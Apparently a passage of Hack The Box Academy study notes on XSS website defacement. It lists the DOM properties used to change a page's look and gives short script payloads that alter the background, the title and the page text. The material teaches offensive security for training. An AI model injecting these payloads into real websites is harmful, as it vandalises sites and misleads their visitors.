## Defacement Elements

Four HTML elements are usually utilized to change the main look of a web page:

- Background Color `document.body.style.background`
- Background `document.body.background`
- Page Title `document.title`
- Page Text `DOM.innerHTML`
## Changing Background

```html
<script>document.body.style.background = "#141d2b"</script>
```

Another option would be to set an image to the background using the following payload:

```html
<script>document.body.background = "https://www.hackthebox.eu/images/logo-htb.svg"</script>
```
## Changing Page Title

```html
<script>document.title = 'HackTheBox Academy'</script>
```
## Changing Page Text

```js
document.getElementById("todo").innerHTML = "New Text"
```

```js
$("#todo").html('New Text');
```

```js
document.getElementsByTagName('body')[0].innerHTML = "New Text"
```
